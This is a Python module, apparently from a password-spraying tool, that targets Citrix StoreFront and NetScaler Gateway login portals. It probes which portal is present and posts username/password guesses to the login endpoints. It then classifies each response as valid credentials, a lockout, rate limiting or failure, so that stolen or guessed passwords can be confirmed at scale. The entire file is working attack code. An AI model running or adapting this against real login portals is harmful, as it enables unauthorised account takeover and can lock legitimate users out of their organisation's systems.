"""
Citrix StoreFront / NetScaler Gateway spray target.

Most StoreFront deployments expose `/Citrix/StoreWeb/PostCredentialsAuth/Login`.
NetScaler Gateway typically uses `/cgi/login` with NSC_USER / NSC_PASS fields.
"""
import requests

from . import DEFAULT_TIMEOUT as _TIMEOUT


def attempt(
    username: str,
    password: str,
    base_url: str,
    proxies: dict | None = None,
    headers: dict | None = None,
    verify: bool = True,
) -> dict:
    """
    Returns dict with keys: success (bool), locked (bool), notes (str).
    base_url should be like https://citrix.company.com (no trailing slash).
    Auto-detects StoreFront vs NetScaler based on a probe.
    """
    base = base_url.rstrip("/")
    session = requests.Session()

    # Probe for NetScaler Gateway first (most common externally).
    try:
        probe = session.get(
            f"{base}/cgi/login", timeout=_TIMEOUT, verify=verify,
            proxies=proxies, headers=headers, allow_redirects=False,
        )
    except Exception:
        probe = None

    if probe is not None and probe.status_code in (200, 302):
        return _netscaler_attempt(
            session, base, username, password, proxies, headers, verify,
        )
    return _storefront_attempt(
        session, base, username, password, proxies, headers, verify,
    )


def _netscaler_attempt(session, base, username, password, proxies, headers, verify) -> dict:
    url = f"{base}/cgi/login"
    data = {"login": username, "passwd": password}
    try:
        r = session.post(
            url, data=data, allow_redirects=False, timeout=_TIMEOUT,
            verify=verify, proxies=proxies, headers=headers,
        )
    except Exception as e:
        return {"success": False, "locked": False, "notes": f"request error: {e}"}

    if r.status_code == 429:
        return {"success": False, "locked": False, "notes": "rate_limited"}

    body = (r.text or "").lower()
    if "locked" in body or "disabled" in body:
        return {"success": False, "locked": True, "notes": "locked/disabled"}

    if r.status_code in (302, 303):
        location = r.headers.get("Location", "")
        if "logout" in location or "failure" in location.lower():
            return {"success": False, "locked": False, "notes": "invalid (redirect)"}
        return {"success": True, "locked": False, "notes": "valid (NetScaler)"}

    if r.status_code == 200 and "invalid" in body:
        return {"success": False, "locked": False, "notes": "invalid"}

    return {"success": False, "locked": False, "notes": f"status={r.status_code}"}


def _storefront_attempt(session, base, username, password, proxies, headers, verify) -> dict:
    url = f"{base}/Citrix/StoreWeb/PostCredentialsAuth/Login"
    data = {"username": username, "password": password, "loginType": "Default"}
    try:
        r = session.post(
            url, data=data, allow_redirects=False, timeout=_TIMEOUT,
            verify=verify, proxies=proxies, headers=headers,
        )
    except Exception as e:
        return {"success": False, "locked": False, "notes": f"request error: {e}"}

    if r.status_code == 429:
        return {"success": False, "locked": False, "notes": "rate_limited"}

    body = (r.text or "").lower()
    if "locked" in body:
        return {"success": False, "locked": True, "notes": "locked"}

    if r.status_code in (200, 302, 303):
        if "success" in body or "accept" in body:
            return {"success": True, "locked": False, "notes": "valid (StoreFront)"}
        if "fail" in body or "invalid" in body or "incorrect" in body:
            return {"success": False, "locked": False, "notes": "invalid"}

    return {"success": False, "locked": False, "notes": f"status={r.status_code}"}
